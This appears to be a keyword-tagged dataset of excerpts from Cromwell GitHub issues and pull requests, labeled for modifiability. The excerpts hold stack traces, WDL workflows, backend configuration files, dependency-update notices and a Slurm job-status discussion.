scala.Function0.apply$mcV$sp$(Function0.scala:42); at scal,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7255:3045,Config,ConfigFactory,3045,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7255,1,['Config'],['ConfigFactory']
Modifiability,"seeing something that looks like a bug? Then great! You're in the right place. -->; I clone the source code and assembly the jar. when try to run a sge job, I got and error. the log is following:. [2018-06-21 20:36:29,51] [error] DispatchedConfigAsyncJobExecutionActor [7ec0863atestsge.filter:NA:1]: Error attempting to Execute; java.lang.IllegalArgumentException: No coercion defined from '1' of type 'eu.timepit.refined.api.Refined' to 'Int'.; at wom.types.WomType.coerceRawValue(WomType.scala:36); at wom.types.WomType.coerceRawValue$(WomType.scala:27); at wom.types.WomIntegerType$.coerceRawValue(WomIntegerType.scala:9); at cromwell.backend.impl.sfs.config.DeclarationValidation.$anonfun$extractWdlValueOption$1(DeclarationValidation.scala:113); at scala.Option.map(Option.scala:146); at cromwell.backend.impl.sfs.config.DeclarationValidation.extractWdlValueOption(DeclarationValidation.scala:113); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.$anonfun$runtimeAttributeInputs$1(ConfigAsyncJobExecutionActor.scala:163). <!-- Which backend are you running? -->; I use the SGE backend ; <!-- Paste/Attach your workflow if possible: -->; this is my WDL workflow; """"""; workflow testsge{; String Outdir; String JobName=""filter""; call filter{input:outdir=Outdir,jobname=JobName}; }. task filter{; String outdir; String jobname; command<<<; echo ""test successful"" >>${outdir}/log.stdout; echo 1; perl -we '{print STDERR 2;}'; Script=""${jobname}""; Sleep=$SGE_TASK_ID; QsubRcControl=3; QsubType=1; >>>; runtime{; backend:""SGE""; memory:""1 GB""; sge_queue:""test.q -P test -t 1-3""; sge_project:""test""; jobs_name:""${jobname}""; }; output{; String presuccess=""done""; Int rc=read_lines(stdout())[0]; }; }; """"""; <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; this my runtime-attributes setting in the reference.conf file. runtime-attributes = """"""; Int cpu = 1; Float? memory_gb; String? jobs_name; String? sge_queue; String? sge",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3805:1521,Config,ConfigAsyncJobExecutionActor,1521,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3805,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"seems like this was already implemented as a backend configuration option `glob-link-command`, so I simply updated the configuration example files to include an example of how to set `glob-link-command` to use soft-links instead. Was able to run on beeGFS with the updated configuration.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5250#issuecomment-549502892:53,config,configuration,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5250#issuecomment-549502892,6,['config'],['configuration']
Modifiability,services'; akka.actor.ActorInitializationException: akka://cromwell-system/user/cromwell-service/ServiceRegistryActor: exception during creation; 	at akka.actor.ActorInitializationException$.apply(Actor.scala:193); 	at akka.actor.ActorCell.create(ActorCell.scala:669); 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:523); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:545); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: com.typesafe.config.ConfigException$Missing: No configuration setting found for key 'services'; 	at com.typesafe.config.impl.SimpleConfig.findKeyOrNull(SimpleConfig.java:156); 	at com.typesafe.config.impl.SimpleConfig.findOrNull(SimpleConfig.java:174); 	at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:188); 	at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:193); 	at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:268); 	at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:41); 	at cromwell.services.ServiceRegistryActor$.serviceNameToPropsMap(ServiceRegistryActor.scala:35); 	at cromwell.services.ServiceRegistryActor.serviceProps(ServiceRegistryActor.scala:63); 	at cromwell.services.ServiceRegistryActor.<init>(ServiceRegistryActor.scala:65); 	at cromwell.services.ServiceRegistryActor$.$anonfun$props$1(ServiceRegistryActor.scala:25); 	at akka.actor.TypedCreatorFunctionConsumer.produce(IndirectActorProducer.scala:87); 	at akka.actor.Props.newActor(Props.scala:212); 	at akka.actor.ActorCell.newActor(ActorCell.scala:624); 	at akka.actor.ActorC,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881:1179,config,config,1179,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881,1,['config'],['config']
Modifiability,"set changesets/failure_metadata.xml::failure_to_message::cjllanwarne:; Reason: liquibase.exception.DatabaseException: Unknown column '%failures[%]%:failure' in 'where clause' [Failed SQL: UPDATE METADATA_ENTRY; SET METADATA_KEY = CONCAT(TRIM(TRAILING ':failure' FROM METADATA_KEY), "":message""); WHERE METADATA_KEY LIKE ""%failures[%]%:failure""]; 	at liquibase.changelog.ChangeSet.execute(ChangeSet.java:619); 	at liquibase.changelog.visitor.UpdateVisitor.visit(UpdateVisitor.java:51); 	at liquibase.changelog.ChangeLogIterator.run(ChangeLogIterator.java:79); 	at liquibase.Liquibase.update(Liquibase.java:214); 	at liquibase.Liquibase.update(Liquibase.java:192); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:62); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:34); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:155); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); Caused by: liquibase.exception.DatabaseException: Unknown column '%failures[%]%:failure' in 'where clause' [Failed SQL: UPDATE METADATA_ENTRY; SET METADATA_KEY = CONCAT(TRIM(TRAILING ':failure' FROM METADATA_KEY), "":message""); WHERE METADATA_KEY LIKE ""%failures[%]%:failure""]; 	at liquibase.executor.jvm.JdbcExecut",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459580103:1995,Enhance,EnhancedSqlDatabase,1995,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459580103,1,['Enhance'],['EnhancedSqlDatabase']
Modifiability,sfs.SharedFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:121); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:208); at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(StandardAsyncExecutionActor.scala:599); at scala.util.Try$.apply(Try.scala:209); at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync(StandardAsyncExecutionActor.scala:599); at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync$(StandardAsyncExecutionActor.scala:599); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.executeAsync(ConfigAsyncJobExecutionActor.scala:208); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:912); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:904); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:208); at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncBackendJobExecutionActor.scala:65); at cromwell.core.retry.Retry$.withRetry(Retry.scala:37); at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover(AsyncBackendJobExecutionActor.scala:65); at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala:88); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); at akka.actor.Actor.aroundReceive(Actor.scala:514); at akka.actor.Actor.aroundReceive$(Actor.scala:512); at cromwell.backend.impl.sfs.config.DispatchedConfigAs,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3927:3459,config,config,3459,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3927,1,['config'],['config']
Modifiability,"sfs.SharedFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:139); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(StandardAsyncExecutionActor.scala:637); at scala.util.Try$.apply(Try.scala:209); at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync(StandardAsyncExecutionActor.scala:637); at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync$(StandardAsyncExecutionActor.scala:637); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.executeAsync(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:952); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:944); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncBackendJobExecutionActor.scala:65); at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); at cromwell.core.retry.Retry$$anonfun$withRetry$1.$anonfun$applyOrElse$3(Retry.scala:45); at akka.pattern.FutureTimeoutSupport.liftedTree1$1(FutureTimeoutSupport.scala:26); at akka.pattern.FutureTimeoutSupport.$anonfun$after$1(FutureTimeoutSupport.scala:26); at akka.actor.Scheduler$$anon$4.run(Scheduler.scala:205); ... 6 more. </code></pre>; </details>. This is a minimal example of a config which gets such an error:; `Could not evaluate expression: ""echo "" + memory: Cannot perform operation: echo + WomLong(4)`; ```; include required(classpath(""application"")); webservice {; port = 8000; }; backend {; default=""Local""; providers {; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLif",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4659:4596,config,config,4596,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4659,1,['config'],['config']
Modifiability,"sfs.SharedFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:155); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(StandardAsyncExecutionActor.scala:639); at scala.util.Try$.apply(Try.scala:209); at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync(StandardAsyncExecutionActor.scala:639); at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync$(StandardAsyncExecutionActor.scala:639); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeAsync(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:954); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:946); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncBackendJobExecutionActor.scala:65); at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); at cromwell.core.retry.Retry$$anonfun$withRetry$1.$anonfun$applyOrElse$3(Retry.scala:45); at akka.pattern.FutureTimeoutSupport.liftedTree1$1(FutureTimeoutSupport.scala:26); at akka.pattern.FutureTimeoutSupport.$anonfun$after$1(FutureTimeoutSupport.scala:26); at akka.actor.Scheduler$$anon$4.run(Scheduler.scala:205); ... 6 more; Caused by: common.exception.AggregatedMessageException: Error(s):; Cannot interpolate Array[Nothing] into a command string with attribute set [PlaceholderAttributeSet(None,None,None,None)]; at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73); at cromwell.backend.s",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5092:5285,config,config,5285,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5092,1,['config'],['config']
Modifiability,"sian.net/projects/BA/issues; ###; ### You may need to create an account before you can view/create issues.; ###. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->; [2022-03-03 19:26:59,66] [info] WorkflowManagerActor: Workflow 496206d8-8854-48c1-abed-3717510ceb4e failed (during ExecutingWorkflowState): cromwell.engine.io.IoAttempts$EnhancedCromwellIoException: [Attempted 1 time(s)] - IOException: Could not read from s3://mys3-cloudformation/cromwell-execution/wf_hello/496206d8-8854-48c1-abed-3717510ceb4e/call-hello/hello-rc.txt: s3://s3.amazonaws.com/mys3-cloudformation/cromwell-execution/wf_hello/496206d8-8854-48c1-abed-3717510ceb4e/call-hello/hello-rc.txt; Caused by: java.io.IOException: Could not read from s3://mys3-cloudformation/cromwell-execution/wf_hello/496206d8-8854-48c1-abed-3717510ceb4e/call-hello/hello-rc.txt: s3://s3.amazonaws.com/mys3-cloudformation/cromwell-execution/wf_hello/496206d8-8854-48c1-abed-3717510ceb4e/call-hello/hello-rc.txt. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->; ![image](https://user-images.githubusercontent.com/96741804/156643007-76a24c99-509c-4480-8484-df1c6f7b9c72.png). <!-- Which backend are you running? -->. AWS Batch. <!-- Paste/Attach your workflow if possible: -->. I have see this as an issue previously reported ; I am trying to set up a genomics work flow using AWS batch and Cromwell . How to solve this",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6695:1021,Enhance,EnhancedCromwellIoException,1021,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6695,1,['Enhance'],['EnhancedCromwellIoException']
Modifiability,"sk_sequence.wdl"" as SingleTest. workflow run_multiple_tests {; scatter (i in range(30)){; call SingleTest.three_task_sequence{}; }; }; ```. three_task_sequence.wdl; ```; workflow three_task_sequence{; call print_nach. call print_nach_nachman {; input:; previous = print_nach.out; }. call print_nach_nachman_meuman{; input:; previous = print_nach_nachman.out; }; output{; Array[String] out = print_nach_nachman_meuman.out; }; }. task print_nach{; command{; echo ""nach""; }; output{; Array[String] out = read_lines(stdout()); }; runtime {; 	 docker: ""ubuntu:latest""; 	 maxRetries: 3; }; }. task print_nach_nachman{; Array[String] previous. command{; echo ${sep=' ' previous} "" nachman""; }; output{; Array[String] out = read_lines(stdout()); }; runtime {; docker: ""ubuntu:latest""; maxRetries: 3; }; ; }. task print_nach_nachman_meuman{; Array[String] previous. command{; echo ${sep=' ' previous} "" meuman""; }; output{; Array[String] out = read_lines(stdout()); }; runtime {; docker: ""ubuntu:latest""; maxRetries: 3; }; }; ```. Here is the cromwell-conf:; ```; // aws.conf; include required(classpath(""application"")). webservice {; port = 8001; interface = 0.0.0.0; }. aws {; application-name = ""cromwell""; auths = [{; name = ""default""; scheme = ""default""; }]; region = ""us-east-1""; }. engine {; filesystems {; s3 { auth = ""default"" }; }; }. backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; root = ""s3://nrglab-cromwell-genomics/cromwell-execution""; auth = ""default"". numSubmitAttempts = 3; numCreateDefinitionAttempts = 3. concurrent-job-limit = 100. default-runtime-attributes {; queueArn: ""arn:aws:batch:us-east-1:66:job-queue/GenomicsDefaultQueue""; }. filesystems {; s3 {; auth = ""default""; }; }; }; }; }; }. system {; job-rate-control {; jobs = 1; per = 1 second; }; }; ```. Would appreciate help on this.; I wonder if cromwell was ever tested for many parallel sub-workflows running on AWS?. Thanks!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4687:2932,config,config,2932,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4687,1,['config'],['config']
Modifiability,"snakeyaml/snakeyaml/src/master/Changelog.markdown) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/Changelog.rst) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/changelog.md) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/changelog.markdown) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/changelog.rst) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/CHANGES.md) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/CHANGES.markdown) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/CHANGES.rst). I'll automatically update this PR to resolve conflicts as long as you don't change it yourself. If you'd like to skip this version, you can just close this PR. If you have any feedback, just mention me in the comments below. Configure Scala Steward for your repository with a [`.scala-steward.conf`](https://github.com/scala-steward-org/scala-steward/blob/00809e6249b134635f71919c17c1c81603beb22d/docs/repo-specific-configuration.md) file. Have a fantastic day writing Scala!. <details>; <summary>Files still referring to the old version number</summary>. The following files still refer to the old version number (1.29).; You might want to review and update them manually.; ```; centaur/src/test/resources/centaur/test/metadata/failingInSeveralWaysMetadata.json; core/src/test/resources/hello_goodbye_scattered_papiv2.json; docs/developers/bitesize/ci/Cromwell_Deployment_Strategies.svg; docs/developers/bitesize/workflowParsing/forkjoin_graph.svg; docs/developers/bitesize/workflowParsing/wdlToWdlom_hermes.svg; scripts/metadata_comparison/test/resources/comparer/papiv1_version3_good.json; scripts/metadata_comparison/test/resources/comparer/papiv2_version3_good.json; ```; </details>; <details>; <summary>Ignore future updates</summary>. Add this to your `.scala-steward.conf` file to ignore future updates of this dependency:; ```; updates.ignore = [ { groupId = ""org.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6635:2553,config,configuration,2553,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6635,1,['config'],['configuration']
Modifiability,"snakeyaml/snakeyaml/src/master/Changelog.markdown) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/Changelog.rst) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/changelog.md) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/changelog.markdown) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/changelog.rst) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/CHANGES.md) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/CHANGES.markdown) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/CHANGES.rst). I'll automatically update this PR to resolve conflicts as long as you don't change it yourself. If you'd like to skip this version, you can just close this PR. If you have any feedback, just mention me in the comments below. Configure Scala Steward for your repository with a [`.scala-steward.conf`](https://github.com/scala-steward-org/scala-steward/blob/2dc2301e75aea6c2d0c49b89d6092f7d4f134b40/docs/repo-specific-configuration.md) file. Have a fantastic day writing Scala!. <details>; <summary>Files still referring to the old version number</summary>. The following files still refer to the old version number (1.30).; You might want to review and update them manually.; ```; docs/developers/bitesize/workflowParsing/wdlToWdlom_hermes.svg; scripts/metadata_comparison/test/resources/comparer/papiv1_version3_good.json; scripts/metadata_comparison/test/resources/comparer/papiv2_version3_good.json; scripts/metadata_comparison/test/resources/comparer/version3_comparison_good.csv; ```; </details>; <details>; <summary>Adjust future updates</summary>. Add this to your `.scala-steward.conf` file to ignore future updates of this dependency:; ```; updates.ignore = [ { groupId = ""org.yaml"", artifactId = ""snakeyaml"" } ]; ```; Or, add this to slow down future updates of this dependency:; ```; dependencyOverrides = [{; pullRequests = { frequency = ""@monthly"" },; dependenc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6900:2553,config,configuration,2553,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6900,1,['config'],['configuration']
Modifiability,sourceWithoutFallback(SimpleIncluder.java:123); at com.typesafe.config.impl.SimpleIncluder.includeResources(SimpleIncluder.java:109); at com.typesafe.config.impl.ConfigParser$ParseContext.parseInclude(ConfigParser.java:181); at com.typesafe.config.impl.ConfigParser$ParseContext.parseObject(ConfigParser.java:237); at com.typesafe.config.impl.ConfigParser$ParseContext.parseValue(ConfigParser.java:103); at com.typesafe.config.impl.ConfigParser$ParseContext.parse(ConfigParser.java:415); at com.typesafe.config.impl.ConfigParser.parse(ConfigParser.java:25); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:263); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:250); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:180); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:174); at com.typesafe.config.impl.Parseable.parse(Parseable.java:301); at com.typesafe.config.ConfigFactory.parseFile(ConfigFactory.java:793); at com.typesafe.config.ConfigFactory.parseApplicationReplacement(ConfigFactory.java:1166); at com.typesafe.config.DefaultConfigLoadingStrategy.parseApplicationConfig(DefaultConfigLoadingStrategy.java:11); at com.typesafe.config.ConfigFactory.defaultApplication(ConfigFactory.java:532); at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:264); at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:261); at com.typesafe.config.impl.ConfigImpl$LoaderCache.getOrElseUpdate(ConfigImpl.java:66); at com.typesafe.config.impl.ConfigImpl.computeCachedConfig(ConfigImpl.java:93); at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:261); at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:237); at cromwell.languages.util.ImportResolver$HttpResolver$.apply(ImportResolver.scala:237); at womtool.input.WomGraphMaker$.importResolvers$lzycompute$1(WomGraphMaker.scala:28); at womtool.input.WomGraphMaker$.importResolvers$1(WomGraphMaker.scala:27); at womtool.input.WomGraphMaker$.$anonfun$get,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7255:2360,config,config,2360,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7255,1,['config'],['config']
Modifiability,"spartan.conf) -jar cromwell-36.jar`, the error it printed was:. ```; Exception in thread ""main"" java.lang.ExceptionInInitializerError; 	at cromwell.CromwellApp$.runCromwell(CromwellApp.scala:14); 	at cromwell.CromwellApp$.delayedEndpoint$cromwell$CromwellApp$1(CromwellApp.scala:25); 	at cromwell.CromwellApp$delayedInit$body.apply(CromwellApp.scala:3); 	at scala.Function0.apply$mcV$sp(Function0.scala:34); 	at scala.Function0.apply$mcV$sp$(Function0.scala:34); 	at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:12); 	at scala.App.$anonfun$main$1$adapted(App.scala:76); 	at scala.collection.immutable.List.foreach(List.scala:389); 	at scala.App.main(App.scala:76); 	at scala.App.main$(App.scala:74); 	at cromwell.CromwellApp$.main(CromwellApp.scala:3); 	at cromwell.CromwellApp.main(CromwellApp.scala); Caused by: com.typesafe.config.ConfigException$Parse: /data/cephfs/punim0751/spartan.conf: 27: expecting a close parentheses ')' here, not: end of file; 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseError(ConfigDocumentParser.java:201); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseError(ConfigDocumentParser.java:197); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseKey(ConfigDocumentParser.java:279); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseObject(ConfigDocumentParser.java:450); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseValue(ConfigDocumentParser.java:247); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseObject(ConfigDocumentParser.java:458); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parse(ConfigDocumentParser.java:648); 	at com.typesafe.config.impl.ConfigDocumentParser.parse(ConfigDocumentParser.java:14); 	at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:260); 	at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:248); 	at com.typesafe.config.impl.Parseable.parseValue",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4549:1731,config,config,1731,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4549,1,['config'],['config']
Modifiability,"spatcher-7 INFO - Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-673c553"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""failureShutdownDuration"" : ""5 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; 2019-07-21 23:34:37,771 cromwell-system-akka.actor.default-dispatcher-3 INFO - KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; 2019-07-21 23:34:37,918 cromwell-system-akka.dispatchers.service-dispatcher-14 INFO - Metadata summary refreshing every 1 second.; 2019-07-21 23:34:38,046 WARN - 'docker.hash-lookup.gcr-api-queries-per-100-seconds' is being deprecated, use 'docker.hash-lookup.gcr.throttle' instead (see reference.conf); 2019-07-21 23:34:38,160 cromwell-system-akka.dispatchers.service-dispatcher-13 INFO - WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; 2019-07-21 23:34:38,160 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - JobStoreWriterActor configured to flush with batch size 1000 and process rate 1 second.; 2019-07-21 23:34:38,594 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; 2019-07-21 23:34:38,667 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; 2019-07-21 23:34:39,131 cromwell-system-akka.dispatchers.backend-dispatcher-36 INFO - Running with 3 PAPI request workers; 2019-07-21 23:34:39,132 cromwell-system-akka.dispatchers.backend-dispatcher-36 INFO - PAPI request worker batch interval is 33333 milliseconds; 2019-07-21 23:34:39,157 cromwell-system-akka.dispatchers.backend-dispatcher-37 INFO - PAPI request worker batch interval is 33333 milliseconds; 2019-07-21 23:34:39,233 cromwell-system-akka.dispatchers.backend-dispatcher-38 INFO - PAPI request worker batch interval is 33333 milliseconds; ```. but then it immediately starts printing these errors:; ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5084:2587,config,configured,2587,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5084,1,['config'],['configured']
Modifiability,"src/ci/resources/slurm_application.conf. > # https://slurm.schedmd.com/squeue.html; > --; > 25 | check-alive = ""squeue -j ${job_id}"". The job state is being checked by the exit code: 0 means job not complete, non-zero is assumed to be job complete. This assumption is false. This is depending on site configured behavior about how quickly finished jobs are moved from the active controller the sacct database, as only after that happens the squeue command ""fails"" because the job isn't in the active DB anymore. Furthermore, if the job fails or is cancelled, cromwell will also falsely presume the job is complete since it's also no longer in the active DB. When the squeue command itself fails or times out, a non-zero exit code is also returned, which is again incorrectly interpreted as a completed job. . ""But if your squeue command fails you're whole machine is already broken!""; No. On a very busy slurm machine it is expected behavior that sometimes commands will time out when the 